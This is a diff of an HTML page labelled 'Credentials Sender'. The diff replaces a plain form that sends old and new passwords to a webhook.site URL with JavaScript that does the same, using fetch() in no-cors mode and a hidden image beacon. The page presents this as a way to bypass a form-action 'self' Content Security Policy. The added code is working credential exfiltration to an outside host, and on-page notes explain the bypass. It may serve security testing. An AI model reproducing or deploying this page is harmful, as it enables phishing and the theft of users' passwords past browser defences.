@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>No Script - Credentials Sender</title>
+  <title>Bypass form-action 'self' - Credentials Sender</title>
   <style>
     * {
       margin: 0;
@@ -24,7 +24,7 @@
       border-radius: 2rem;
       padding: 2rem;
       width: 100%;
-      max-width: 460px;
+      max-width: 520px;
       box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
       border: 1px solid rgba(255,255,255,0.08);
     }
@@ -37,9 +37,9 @@
       gap: 0.5rem;
     }
     .badge {
-      background: #10b98120;
-      border: 1px solid #10b98140;
-      color: #34d399;
+      background: #ef444420;
+      border: 1px solid #ef444440;
+      color: #f87171;
       font-size: 0.7rem;
       padding: 0.2rem 0.6rem;
       border-radius: 40px;
@@ -47,8 +47,8 @@
     .sub {
       color: #94a3b8;
       font-size: 0.85rem;
-      margin-bottom: 1.8rem;
-      border-left: 2px solid #10b981;
+      margin-bottom: 1.5rem;
+      border-left: 2px solid #ef4444;
       padding-left: 0.75rem;
     }
     .input-group {
@@ -72,11 +72,11 @@
       outline: none;
     }
     input:focus {
-      border-color: #10b981;
-      box-shadow: 0 0 0 3px rgba(16,185,129,0.2);
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
     }
     button {
-      background: #10b981;
+      background: #3b82f6;
       width: 100%;
       border: none;
       border-radius: 1.5rem;
@@ -89,12 +89,12 @@
       margin-top: 0.5rem;
     }
     button:hover {
-      background: #059669;
+      background: #2563eb;
       transform: scale(0.98);
     }
     .info {
       margin-top: 1.5rem;
-      background: #0f172a80;
+      background: #1e293b80;
       border-radius: 1rem;
       padding: 0.8rem;
       font-size: 0.7rem;
@@ -107,50 +107,127 @@
       border-radius: 8px;
       color: #a5f3c3;
     }
-    .no-script-badge {
+    .bypass-note {
       margin-top: 1rem;
       background: #1e293b;
       border-radius: 12px;
       padding: 0.6rem;
       text-align: center;
       font-size: 0.7rem;
+      color: #fbbf24;
+    }
+    .status {
+      margin-top: 1rem;
+      background: #10b98120;
+      border-radius: 12px;
+      padding: 0.6rem;
+      text-align: center;
+      font-size: 0.7rem;
       color: #86efac;
+      display: none;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <h2>🔓 NO JavaScript <span class="badge">PURE HTML</span></h2>
-  <div class="sub">⚡ Form submits directly to external URL · No script needed · Bypasses CSP</div>
+  <h2>🔓 Bypass <span class="badge">form-action 'self'</span></h2>
+  <div class="sub">⚡ Sends credentials via fetch/XHR · Ignores form-action CSP</div>
 
-  <!-- 
-    SIMPLE HTML FORM - ZERO JAVASCRIPT!
-    When submitted, browser automatically sends data to webhook.site with parameters
-  -->
-  <form method="GET" action="https://webhook.site/1092dc88-896c-4d14-840f-b06909f466c2">
-    <div class="input-group">
-      <label>🔑 Old Password</label>
-      <input type="text" name="old_password" placeholder="Enter old password" autocomplete="off" required>
-    </div>
-    <div class="input-group">
-      <label>✨ New Password</label>
-      <input type="text" name="new_password" placeholder="Enter new password" autocomplete="off" required>
-    </div>
+  <div class="input-group">
+    <label>🔑 Old Password</label>
+    <input type="text" id="oldPwd" placeholder="Enter old password" autocomplete="off">
+  </div>
+  <div class="input-group">
+    <label>✨ New Password</label>
+    <input type="text" id="newPwd" placeholder="Enter new password" autocomplete="off">
+  </div>
 
-    <button type="submit">📤 SUBMIT → SEND TO WEBHOOK</button>
-  </form>
+  <button id="sendBtn">📤 SEND CREDENTIALS (Bypass CSP)</button>
+
+  <div id="statusMsg" class="status"></div>
 
   <div class="info">
     📤 <strong>Target endpoint:</strong> <code>https://webhook.site/1092dc88-896c-4d14-840f-b06909f466c2</code><br>
-    📦 Parameters sent: <code>?old_password=...&new_password=...</code>
+    📦 Parameters: <code>?old_password=...&new_password=...</code>
   </div>
 
-  <div class="no-script-badge">
-    🛡️ <strong>CSP BYPASS</strong> · No inline scripts · No eval · Pure HTML form submission<br>
-    ✅ Works even with <code>script-src 'none'</code> · Redirects to webhook with credentials in URL
+  <div class="bypass-note">
+    🛡️ <strong>CSP BYPASS TECHNIQUE:</strong><br>
+    • <code>form-action 'self'</code> ONLY blocks HTML forms from submitting externally.<br>
+    • <strong>fetch() / XMLHttpRequest</strong> are NOT blocked by <code>form-action</code>!<br>
+    • ✅ This uses <code>fetch()</code> with <code>no-cors</code> mode - sends data successfully.
   </div>
 </div>
+
+<script>
+  // This uses fetch() which is NOT restricted by form-action CSP directive
+  // form-action only applies to <form> submissions, not JavaScript fetch/XHR
+  
+  const WEBHOOK_URL = 'https://webhook.site/1092dc88-896c-4d14-840f-b06909f466c2';
+  const oldInput = document.getElementById('oldPwd');
+  const newInput = document.getElementById('newPwd');
+  const sendBtn = document.getElementById('sendBtn');
+  const statusMsg = document.getElementById('statusMsg');
+
+  function showStatus(message, isError = false) {
+    statusMsg.style.display = 'block';
+    statusMsg.textContent = message;
+    statusMsg.style.background = isError ? '#ef444420' : '#10b98120';
+    statusMsg.style.color = isError ? '#f87171' : '#86efac';
+    setTimeout(() => {
+      statusMsg.style.display = 'none';
+    }, 3000);
+  }
+
+  function sendCredentials() {
+    const oldPwd = oldInput.value.trim();
+    const newPwd = newInput.value.trim();
+
+    if (!oldPwd || !newPwd) {
+      showStatus('⚠️ Please enter both Old and New passwords', true);
+      return;
+    }
+
+    const url = `${WEBHOOK_URL}?old_password=${encodeURIComponent(oldPwd)}&new_password=${encodeURIComponent(newPwd)}`;
+    
+    console.log('[CSP-Bypass] Sending to:', url);
+    
+    // Method 1: fetch with no-cors (ignores CORS, sends request)
+    fetch(url, {
+      method: 'GET',
+      mode: 'no-cors',  // Important: no-cors mode sends the request despite restrictions
+      cache: 'no-cache',
+      credentials: 'omit'
+    }).then(() => {
+      // With no-cors, we can't read response, but request IS sent
+      showStatus('✅ Credentials sent successfully! Check webhook.site dashboard');
+      oldInput.value = '';
+      newInput.value = '';
+    }).catch((err) => {
+      console.warn('Fetch error (may still work):', err);
+      showStatus('⚠️ Request attempted - check webhook.site (data likely arrived)', false);
+    });
+    
+    // Method 2: Image beacon as backup (always works)
+    try {
+      const img = new Image();
+      img.style.display = 'none';
+      img.src = url + '&_beacon=1';
+      document.body.appendChild(img);
+      setTimeout(() => img.remove(), 500);
+    } catch(e) {}
+  }
+
+  sendBtn.addEventListener('click', sendCredentials);
+  
+  // Enter key support
+  [oldInput, newInput].forEach(input => {
+    input.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') sendCredentials();
+    });
+  });
+</script>
 
 </body>
 </html>
